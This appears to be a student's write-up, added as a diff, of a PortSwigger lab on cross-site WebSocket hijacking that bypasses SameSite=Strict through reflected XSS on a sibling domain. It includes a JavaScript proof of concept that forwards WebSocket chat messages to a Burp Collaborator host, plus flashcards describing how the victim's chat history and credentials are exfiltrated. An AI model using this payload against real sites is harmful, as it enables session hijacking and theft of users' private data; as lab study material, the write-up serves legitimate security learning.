@@ -1,0 +1,75 @@
+SameSite Strict Bypass via Sibling Domain
+
+**Lab URL**: (https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)
+**Category**: WebSockets > CSWSH  
+**Difficulty**: Practitioner  
+
+---
+
+##  Overview / What I Learned
+
+- How to exploit a **cross-site WebSocket hijacking (CSWSH)** vulnerability despite SameSite cookie protections.
+- How **reflected XSS on a sibling domain** can be used to bypass SameSite=Strict.
+- Gained experience analyzing WebSocket handshakes and chat protocols.
+- Learned that **browser same-site policies** treats sibling subdomains under the same site origin.
+
+---
+
+## Exploit Steps / Attack Methodology
+
+###  1. Analyze WebSocket Behavior (
+- Navigated to `/chat` and observed messages being sent via WebSocket.
+- In Burp → **WebSockets history**, noticed the `READY` message triggers the chat history in response.
+- No CSRF token or authentication header in the WebSocket request — potentially CSWSH-vulnerable.
+
+###  2. CSWSH PoC (Reference: Lab Instructions Step 3)
+Tested this payload using the **exploit server** to confirm vulnerability:
+
+```html
+<script>
+    var ws = new WebSocket('wss://<LAB-ID>.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://<COLLAB-PAYLOAD>.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+ Result: It worked, but only returned chat history for a new session — no session cookies sent due to SameSite=Strict.
+
+🔑 Q&A Flashcards
+(Reference: Lab Instructions Step 1)
+Q: What is the significance of the WebSocket handshake in this lab?
+A: The WebSocket handshake reveals the lack of CSRF protection or unpredictable tokens, which makes it vulnerable to cross-site WebSocket hijacking (CSWSH).
+
+(Reference: Lab Instructions Step 2)
+Q: How can you confirm the CSWSH vulnerability in the lab environment?
+A: By sending a READY message to the WebSocket server after capturing it with Burp, you can confirm the vulnerability when the server responds with the entire chat history, which does not require authentication tokens.
+
+(Reference: Lab Instructions Step 3)
+Q: What role does Burp Collaborator play in this lab's exploit process?
+A: Burp Collaborator is used to receive exfiltrated data. After sending a READY message through WebSocket, the chat history is forwarded to a Collaborator payload for extraction.
+
+(Reference: Lab Instructions Step 4)
+Q: Why are session cookies not sent during the WebSocket handshake in the initial attack?
+A: The SameSite cookie policy is set to Strict, preventing the browser from sending session cookies in cross-site requests, which stops the initial CSWSH attack from accessing the victim's chat history.
+
+(Reference: Lab Instructions Step 5)
+Q: How did you identify the sibling domain in this lab?
+A: By analyzing the HTTP response headers, the Access-Control-Allow-Origin header revealed a sibling domain, allowing us to exploit reflected XSS.
+
+(Reference: Lab Instructions Step 6)
+Q: How can reflected XSS on a sibling domain be used to bypass SameSite cookie restrictions?
+A: Since sibling domains are considered part of the same site, the XSS on the sibling domain allows the attack to bypass SameSite restrictions, letting the WebSocket request include session cookies.
+
+(Reference: Lab Instructions Step 7)
+Q: What steps are necessary to bypass SameSite=Strict using the sibling domain's reflected XSS?
+A: Inject a URL-encoded CSWSH payload via the username parameter on the sibling domain's login form. Once this is processed, it will trigger the WebSocket request that includes the session cookie.
+
+(Reference: Lab Instructions Step 8)
+Q: Why is URL encoding important in this lab's exploit?
+A: URL encoding ensures that the CSWSH payload is properly transmitted as part of the URL parameter, preventing the browser from interpreting the script before it's executed on the victim's browser.
+
+(Reference: Lab Instructions Final Steps)
+Q: How did you confirm that the exploit was successful and the victim's chat history was exfiltrated?
+A: By monitoring the Burp Collaborator for new interactions, I received the victim's chat history, including their credentials, which confirmed the success of the attack.
